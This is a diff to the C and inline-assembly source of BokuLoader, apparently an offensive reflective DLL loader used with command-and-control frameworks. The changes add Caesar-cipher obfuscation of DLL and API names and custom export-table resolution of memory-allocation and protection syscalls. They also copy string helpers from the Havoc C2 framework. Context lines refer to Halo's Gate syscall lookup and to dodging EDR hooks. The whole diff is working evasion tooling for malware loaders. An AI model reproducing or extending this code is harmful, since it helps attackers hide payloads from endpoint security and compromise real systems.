@@ -66,14 +66,23 @@ void  HellDescent(void);
 unsigned long halosGateDown(void * ntdllApiAddr, unsigned long index);
 unsigned long halosGateUp(void * ntdllApiAddr, unsigned long index);
 unsigned long getSyscallNumber(void * functionAddress);
-unsigned __int64 xstrlen(char* string);
 void parseDLL(Dll * dll);
+SIZE_T CharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed );
+SIZE_T StringLengthA(LPCSTR String);
 
 typedef void *  (WINAPI * tLoadLibraryA)  (char *);
-
+typedef void*  (WINAPI * tGetProcAddress)(void*, char*);
 typedef LONG32 (NTAPI  * tNtProt)        (void *, void *, void *, unsigned int, void *);
 typedef LONG32 (NTAPI  * tNtAlloc)       (void *, void *, unsigned long *, PSIZE_T, unsigned long, unsigned long);
 typedef LONG32 (NTAPI  * tNtFree)        (void *, void *, PSIZE_T, unsigned long);
+
+typedef struct APIS{
+    tLoadLibraryA LoadLibraryA;
+    tGetProcAddress GetProcAddress;
+    void* pNtAllocateVirtualMemory;
+    void* pNtProtectVirtualMemory;
+    void* pNtFreeVirtualMemory;
+}APIS;
 
 typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, unsigned int, void *);
 
@@ -329,7 +338,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
                     : "r" (AddressTableEntry), // RAX IN, import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
                       "r" (rdll_dst.dllBase)   // RDX IN
                 );
-                // use xGetProcAddress to dodge EDR hooks on GetProcAddress() and patch in the address for this imported function
+                // patch in the address for this imported function
                 EntryAddress = xGetProcAddress(EntryName, &dll_import);
                 __asm__(
                     "mov [rax], rdx \n" // write the address of the imported api to our import table
@@ -477,112 +486,85 @@ void parseDLL(Dll * dll){
     dll->Export.NumberOfNames = getNumberOfNames(dll->Export.Directory);
 }
 
+void getApis(APIS * api){
+    Dll k32, ntdll;
+        // Get Export Directory and Export Tables for NTDLL.DLL
+    // Original String:   nTDlL.Dll // String Length:     9 // Caesar Chiper Key: 513556 // Chiper String:     hX`BX
+    unsigned char s_ntdll[] = {0x82,0x68,0x58,0x80,0x60,0x42,0x58,0x80,0x80,0x00};
+    basicCaesar_Decrypt(9, s_ntdll, 513556);
+    ntdll.dllBase = getDllBase((char *)s_ntdll);
+    parseDLL(&ntdll);
+
+    // Get Export Directory and Export Tables for Kernel32.dll
+    // Original String:   kERneL32.dLl // String Length:     12 // Caesar Chiper Key: 1 // Chiper String:     lFSofM43/eMm
+    unsigned char s_k32[] = {0x6c,0x46,0x53,0x6f,0x66,0x4d,0x34,0x33,0x2f,0x65,0x4d,0x6d,0x01};
+    basicCaesar_Decrypt(13, s_k32, 1);
+    k32.dllBase = getDllBase((char *)s_k32);
+    parseDLL(&k32);
+
+    unsigned char kstr1[] = {0x36,0x59,0x4b,0x4e,0x36,0x53,0x4c,0x5c,0x4b,0x5c,0x63,0x2b,0x00};
+    basicCaesar_Decrypt(12, kstr1, 234);
+    api->LoadLibraryA = xGetProcAddress(kstr1, &k32);
+
+    unsigned char ntstr2[] = {0x87,0xad,0x7a,0xa5,0xa5,0xa8,0x9c,0x9a,0xad,0x9e,0x8f,0xa2,0xab,0xad,0xae,0x9a,0xa5,0x86,0x9e,0xa6,0xa8,0xab,0xb2,0x00};
+    basicCaesar_Decrypt(23, ntstr2, 1337);
+    api->pNtAllocateVirtualMemory = xGetProcAddress(ntstr2, &ntdll);
+
+    unsigned char ntstr3[] = {0xc4,0xea,0xc6,0xe8,0xe5,0xea,0xdb,0xd9,0xea,0xcc,0xdf,0xe8,0xea,0xeb,0xd7,0xe2,0xc3,0xdb,0xe3,0xe5,0xe8,0xef,0x00};
+    basicCaesar_Decrypt(22, ntstr3, 1010101110);
+    api->pNtProtectVirtualMemory = xGetProcAddress(ntstr3, &ntdll);
+
+    unsigned char ntstr4[] = {0x23,0x49,0x1b,0x47,0x3a,0x3a,0x2b,0x3e,0x47,0x49,0x4a,0x36,0x41,0x22,0x3a,0x42,0x44,0x47,0x4e,0x00};
+    basicCaesar_Decrypt(19, ntstr4, 13013);
+    api->pNtFreeVirtualMemory = xGetProcAddress(ntstr4, &ntdll);
+
+}
+
 void * xGetProcAddress(void * symbolStr, Dll * dll)
 {
-    char   dll_name[64];
-    char   api_name[128];
-    unsigned long  api_length, i;
-    Dll    ref_dll;
-    void * firstEntry;
-    void * currentEntry;
-    unsigned long  StrSize;
-
-    // if there is no export directory, return NULL
-    if (!dll->Export.DirectorySize)
-        return NULL;
-
-    __asm__(
-        "push rbx \n"
-        "xor rcx, rcx \n"        // Get the string length for the import function name
-        "countLoop: \n"
-        "inc cl \n"              // increment the name string length counter
-        "xor rbx, rbx \n"
-        "cmp bl, [rax] \n"       // are we at the null terminator for the string?
-        "je fStrLen \n"
-        "inc rax \n"             // move to the next char of the string
-        "jmp short countLoop \n"
-        "fStrLen: \n"
-        "xchg rax, rcx \n"
-        "pop rbx \n"
-        : "=r" (StrSize)  // RAX OUT
-        : "r" (symbolStr) // RAX IN
-    );
-
+    unsigned __int64 StrSize = (unsigned __int64)( (char*)StringLengthA((char*)symbolStr) + 1);
     void * address = getSymbolAddress(symbolStr, StrSize, dll->dllBase, dll->Export.AddressTable, dll->Export.NameTable, dll->Export.OrdinalTable, dll->Export.NumberOfNames);
 
-    // if not found, return NULL
-    if (!address)
-        return NULL;
-
-    // is this a forward reference?
-    if ((unsigned long *)address >= (unsigned long *)dll->Export.Directory &&
-        (unsigned long *)address <  (unsigned long *)dll->Export.Directory + dll->Export.DirectorySize)
-    {
-        // copy DLL name
-        i = copyWithDelimiter(dll_name, address, sizeof(dll_name) - 4, '.');
-        i--;
-        dll_name[i+1] = 'd';
-        dll_name[i+2] = 'l';
-        dll_name[i+3] = 'l';
-        dll_name[i+4] = 0;
-
-        address += i + 1;
-
-        // copy API name
-        i = copyWithDelimiter(api_name, address, sizeof(api_name) - 1, 0);
-        i--;
-        api_name[i] = 0;
-        api_length = i + 1;
-
-        // see if the DLL is already loaded
-        ref_dll.dllBase = getDllBase(dll_name);
-        if (ref_dll.dllBase)
-        {
-            ref_dll.Export.Directory     = getExportDirectory(ref_dll.dllBase);
-            ref_dll.Export.AddressTable  = getExportAddressTable(ref_dll.dllBase, ref_dll.Export.Directory);
-            ref_dll.Export.NameTable     = getExportNameTable(ref_dll.dllBase, ref_dll.Export.Directory);
-            ref_dll.Export.OrdinalTable  = getExportOrdinalTable(ref_dll.dllBase, ref_dll.Export.Directory);
-            ref_dll.Export.NumberOfNames = getNumberOfNames(ref_dll.Export.Directory);
-            return xGetProcAddress(api_name, &ref_dll);
-        }
-
-        // the DLL was not found by name
-        // loop over each loaded DLL until we find the correct one
-        firstEntry = getFirstEntry();
-        currentEntry = firstEntry;
-        do
-        {
-            ref_dll.dllBase = getDllBaseFromEntry(currentEntry);
-            // ignore the original DLL with the reference
-            if (ref_dll.dllBase == dll->dllBase)
-            {
-                currentEntry = getNextEntry(currentEntry, firstEntry);
-                continue;
-            }
-
-            ref_dll.Export.Directory     = getExportDirectory(ref_dll.dllBase);
-            ref_dll.Export.DirectorySize = getExportDirectorySize(ref_dll.dllBase);
-            // make sure it has an export directory
-            if (!ref_dll.Export.DirectorySize)
-            {
-                currentEntry = getNextEntry(currentEntry, firstEntry);
-                continue;
-            }
-            ref_dll.Export.AddressTable  = getExportAddressTable(ref_dll.dllBase, ref_dll.Export.Directory);
-            ref_dll.Export.NameTable     = getExportNameTable(ref_dll.dllBase, ref_dll.Export.Directory);
-            ref_dll.Export.OrdinalTable  = getExportOrdinalTable(ref_dll.dllBase, ref_dll.Export.Directory);
-            ref_dll.Export.NumberOfNames = getNumberOfNames(ref_dll.Export.Directory);
-            // try to find 'api_name' in this DLL
-            address = getSymbolAddress(api_name, api_length, ref_dll.dllBase, ref_dll.Export.AddressTable, ref_dll.Export.NameTable, ref_dll.Export.OrdinalTable, ref_dll.Export.NumberOfNames);
-            // found?
-            if (address)
-                break;
-            // try the next DLL
-            currentEntry = getNextEntry(currentEntry, firstEntry);
-        } while(currentEntry);
+    if (!address){
+        unsigned char s_k32[] = {0x6c,0x46,0x53,0x6f,0x66,0x4d,0x34,0x33,0x2f,0x65,0x4d,0x6d,0x01};
+        basicCaesar_Decrypt(13, s_k32, 1);
+        Dll k32;
+        k32.dllBase = getDllBase((char *)s_k32);
+        parseDLL(&k32);
+        unsigned char s_GetProcAddress[] = {0x4c,0x6a,0x79,0x55,0x77,0x74,0x68,0x46,0x69,0x69,0x77,0x6a,0x78,0x78,0x00};
+        basicCaesar_Decrypt(14, s_GetProcAddress, 5);
+        tGetProcAddress GetProcAddress = (tGetProcAddress) getSymbolAddress(s_GetProcAddress, 14, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable, k32.Export.NumberOfNames);
+        address = GetProcAddress(dll->dllBase,symbolStr);
     }
 
     return address;
+}
+
+// Havoc C2 function
+SIZE_T StringLengthA(LPCSTR String)
+{
+    LPCSTR String2;
+
+    if ( String == NULL )
+        return 0;
+
+    for (String2 = String; *String2; ++String2);
+
+    return (String2 - String);
+}
+
+// Havoc C2 function
+SIZE_T CharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed )
+{
+    INT Length = (INT)MaximumAllowed;
+
+    while (--Length >= 0)
+    {
+        if ( ! ( *Destination++ = *Source++ ) )
+            return MaximumAllowed - Length - 1;
+    }
+
+    return MaximumAllowed - Length;
 }
 
 __asm__(
@@ -611,7 +593,7 @@ __asm__(
 
 "getDllBase: \n" // RAX, RBX, RCX, RDX, RSI, RDI, R10, R11
     "push rcx \n"                   // save our string arg on the top of the stack
-    "call xstrlen \n"               // RAX will be the strlen
+    "call StringLengthA \n"               // RAX will be the strlen
     "sub rax, 0x4 \n"               // subtract 4 from our string. Truncates the ".dll" or ".exe"
     "mov r10, rax \n"               // save strlen in the r10 reg
     "pop rcx \n"                    // get our string arg from the top of the stack
@@ -660,23 +642,6 @@ __asm__(
     "mov rax, [rbx+0x20] \n"        // DllBase Address in process memory
   "end: \n"
     "ret \n"                        // return to caller
-
-// Clobbers: RAX RCX
-"xstrlen:" // Get the string length for the string
-    "push rbx \n"
-    "xchg rax, rcx \n"              // RAX = string address
-    "xor rcx, rcx \n"   
-"ctLoop: \n"
-    "xor rbx, rbx \n"
-    "cmp bl, [rax] \n"              // are we at the null terminator for the string?
-    "je fLen \n"
-    "inc cl \n"                     // increment the name string length counter
-    "inc rax \n"                    // move to the next char of the string
-    "jmp short ctLoop \n"
-"fLen: \n"
-    "xchg rax, rcx \n" 
-    "pop rbx \n"
-    "ret \n" 
 
 "getExportDirectory: \n"
     "push rbx \n" // save the rbx register to the stack
@@ -754,6 +719,9 @@ __asm__(
     "mov ax, [r11+rax*2] \n"        // [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
     "mov eax, [r9+rax*4] \n"        // RVA API = [&AddressTable + API OrdinalNumber]
     "add rax, r8 \n"                // module.<API> = RVA module.<API> + module.dll BaseAddress
+    "sub r11, rax \n"               // See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
+    "jns ExitGetSysAddr \n"         // If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
+    "mov rax, 0x0 \n"               // If forwarder, return 0x0 and exit
     "jmp ExitGetSysAddr \n"         // Exit function, return symbol address in RAX
 "NotFoundSym: \n"
     "pop rcx \n"                    // Remove string length counter from top of stack
